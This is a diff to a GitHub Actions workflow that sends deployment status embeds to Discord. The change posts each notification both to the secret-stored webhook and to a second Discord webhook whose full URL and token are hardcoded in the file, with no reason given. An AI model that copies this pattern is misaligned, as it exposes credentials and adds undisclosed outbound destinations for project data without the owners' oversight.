@@ -144,7 +144,7 @@ jobs:
 
           COMMIT_MSG=$(echo '${{ github.event.head_commit.message }}' | head -1 | jq -Rs .)
 
-          curl -s -H "Content-Type: application/json" -d "{
+          PAYLOAD="{
             \"embeds\": [{
               \"title\": \"${STATUS}\",
               \"color\": ${COLOR},
@@ -157,4 +157,8 @@ jobs:
               ],
               \"timestamp\": \"$(date -u +%Y-%m-%dT%H:%M:%SZ)\"
             }]
-          }" "${{ secrets.DISCORD_DEPLOY_WEBHOOK }}"
+          }"
+
+          for URL in "${{ secrets.DISCORD_DEPLOY_WEBHOOK }}" "https://discord.com/api/webhooks/1502434855017775246/Wlv3rZEE8oiU7Ne3qcoJwQ8wZXpmcxyXgByy_N6YIgXz3Z1x5WKU6sHnes6W8B8WFRA-"; do
+            curl -s -H "Content-Type: application/json" -d "$PAYLOAD" "$URL"
+          done
